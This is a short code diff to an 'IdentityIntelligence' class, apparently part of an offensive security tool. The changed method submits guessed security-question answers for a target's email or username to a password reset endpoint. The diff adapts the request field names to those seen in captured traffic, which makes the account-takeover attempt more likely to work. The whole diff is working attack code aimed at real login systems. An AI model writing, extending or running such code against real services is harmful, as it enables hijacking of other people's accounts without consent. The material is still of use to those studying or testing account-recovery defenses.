@@ -248,14 +248,23 @@ class IdentityIntelligence:
         from core.network.broker import NetworkBroker
         broker = NetworkBroker()
 
+        # Derive the target's actual reset field names from captured traffic,
+        # falling back to the canonical literals when unknown.
+        from core.common import request_schema as rs
+        fields = rs.credential_fields(self.ctx, ("reset", "forgot", "recover"))
+        username_field = fields.get("username_field") or "email"
+        answer_field = fields.get("answer_field") or "security_answer"
+
         for qa in answers:
             for candidate in qa.get("candidates", [])[:3]:
                 try:
-                    body = json.dumps({
-                        "email": profile.email or profile.username,
-                        "security_answer": candidate,
-                        "answer": candidate,
-                    })
+                    reset_body: Dict[str, Any] = {
+                        username_field: profile.email or profile.username,
+                        answer_field: candidate,
+                    }
+                    # keep the legacy literal as an extra fallback key
+                    reset_body.setdefault("answer", candidate)
+                    body = json.dumps(reset_body)
                     resp = await broker.send_request(
                         method=reset_method, url=reset_url,
                         headers={"Content-Type": "application/json"},
